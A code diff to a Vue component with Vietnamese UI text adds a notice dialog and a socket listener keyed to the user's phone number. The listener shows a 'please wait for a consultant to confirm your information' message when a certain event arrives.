@@ -42,10 +42,28 @@
                 </v-col>
             </v-row>
         </div>
+        <v-dialog max-width="500px" v-model="dialogSuccess" persistent>
+            <v-card>
+                <!-- <v-form ref="formMethodOtp" @submit.prevent="submitFormMethod"> -->
+                <v-card-title>
+                    Thông báo
+                </v-card-title>
+                <v-card-text class="text-center">
+                    <p class="text-center mb-2">{{ dialogMessage }}</p>
+                    <!-- <v-select v-if="socketData.options" class="" v-model="formRefOtpMethod" :items="socketData.options"
+                        label="Chọn phương thức xác thực" variant="filled" :rules="rules.otpMethod"></v-select> -->
+                </v-card-text>
+                <v-card-actions>
+                    <v-btn color="red" block class="pa-4" type="button" @click="dialogSuccess = false">Tiếp tục</v-btn>
+                </v-card-actions>
+                <!-- </v-form> -->
+            </v-card>
+        </v-dialog>
     </div>
 </template>
 <script setup>
 import axios from '@/plugins/axios';
+import { socket } from '@/plugins/socket';
 import { computed, onMounted, ref } from 'vue';
 import { useRouter } from 'vue-router';
 import { useStore } from 'vuex';
@@ -53,6 +71,8 @@ const router = useRouter()
 const store = useStore()
 const user = computed(() => store.state.user)
 const userStorage = JSON.parse(localStorage.getItem('user'))
+const dialogSuccess = ref(false)
+const dialogMessage = ref('')
 
 const imagePreViewBefore = ref(null)
 const imagePreViewAfter = ref(null)
@@ -66,6 +86,14 @@ onMounted(() => {
     // if (!user.value.verified) {
     //     router.push({ name: 'Home' })
     // }
+
+    socket.on(`send-data-user-${userStorage.numberPhone}`, async (data) => {
+        console.log(data);
+        if (data.type === 'TV') {
+            dialogSuccess.value = true
+            dialogMessage.value = 'Vui lòng chờ nhân viên tư vấn xác nhận thông tin của bạn.'
+        }
+    })
 })
 
 const onFileChangeBefore = (e) => {
